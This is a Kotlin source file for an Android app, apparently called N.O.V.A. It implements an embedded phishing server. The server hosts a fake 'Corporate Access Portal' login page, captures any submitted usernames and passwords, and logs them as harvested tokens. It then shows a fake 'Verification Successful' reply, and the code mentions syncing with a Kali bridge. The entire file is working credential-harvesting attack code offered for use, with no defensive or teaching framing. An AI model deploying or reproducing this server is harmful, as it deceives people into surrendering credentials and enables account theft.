package com.spartanai.nova.core

import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.ServerSocket
import java.net.Socket

/**
 * N.O.V.A. Embedded Phishing Server
 * Mandate: Host local credential harvesting pages and capture sovereign tokens.
 */
class PhishingServer(private val orchestrator: NovaOrchestrator) {

    private var serverSocket: ServerSocket? = null
    private var serverJob: Job? = null
    private var isRunning = false

    private val _capturedCredentials = MutableStateFlow<List<String>>(emptyList())
    val capturedCredentials = _capturedCredentials.asStateFlow()

    fun start(port: Int = 8080) {
        if (isRunning) return
        isRunning = true
        
        serverJob = GlobalScope.launch(Dispatchers.IO) {
            try {
                serverSocket = ServerSocket(port)
                orchestrator.addOutput("[PHISH]: Server LIVE on port $port")
                
                while (isRunning) {
                    val client = serverSocket?.accept() ?: break
                    handleClient(client)
                }
            } catch (e: Exception) {
                Log.e("PhishingServer", "Server error: ${e.message}")
                orchestrator.addOutput("[ERROR]: Phish server failure: ${e.message}")
            }
        }
    }

    private fun handleClient(client: Socket) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val reader = BufferedReader(InputStreamReader(client.getInputStream()))
                val writer = PrintWriter(client.getOutputStream())

                val headerLine = reader.readLine() ?: return@launch
                
                // Simple router
                if (headerLine.startsWith("POST")) {
                    captureData(reader)
                    sendResponse(writer, "<html><body><h1>Verification Successful</h1><p>System redirecting...</p></body></html>")
                } else {
                    sendDefaultPage(writer)
                }

                writer.flush()
                client.close()
            } catch (e: Exception) {
                Log.e("PhishingServer", "Client handling error: ${e.message}")
            }
        }
    }

    private fun captureData(reader: BufferedReader) {
        var line: String?
        var contentLength = 0
        while (reader.readLine().also { line = it } != null && line!!.isNotEmpty()) {
            if (line!!.startsWith("Content-Length:")) {
                contentLength = line!!.substringAfter(":").trim().toInt()
            }
        }

        val body = CharArray(contentLength)
        reader.read(body, 0, contentLength)
        val data = String(body)
        
        val record = "CAPTURE [${System.currentTimeMillis()}]: $data"
        val current = _capturedCredentials.value.toMutableList()
        current.add(record)
        _capturedCredentials.value = current
        
        orchestrator.addOutput("[PHISH]: TOKEN HARVESTED.")
        orchestrator.speak("Credential captured. Syncing with Kali bridge.")
    }

    private fun sendDefaultPage(writer: PrintWriter) {
        val html = """
            HTTP/1.1 200 OK
            Content-Type: text/html

            <html>
            <head><title>Secure Login</title></head>
            <body style='background: #111; color: #0f0; font-family: monospace; padding: 50px;'>
                <h2>Corporate Access Portal</h2>
                <p>Security verification required for your current IP.</p>
                <form method='POST' action='/'>
                    Username: <input type='text' name='user' style='background: #222; color: #0f0; border: 1px solid #0f0;'><br><br>
                    Password: <input type='password' name='pass' style='background: #222; color: #0f0; border: 1px solid #0f0;'><br><br>
                    <input type='submit' value='AUTHENTICATE' style='background: #0f0; color: #000; border: none; padding: 10px;'>
                </form>
            </body>
            </html>
        """.trimIndent()
        writer.println(html)
    }

    private fun sendResponse(writer: PrintWriter, body: String) {
        writer.println("HTTP/1.1 200 OK")
        writer.println("Content-Type: text/html")
        writer.println("Content-Length: ${body.length}")
        writer.println()
        writer.println(body)
    }

    fun stop() {
        isRunning = false
        serverSocket?.close()
        serverJob?.cancel()
        orchestrator.addOutput("[PHISH]: Server offline.")
    }
}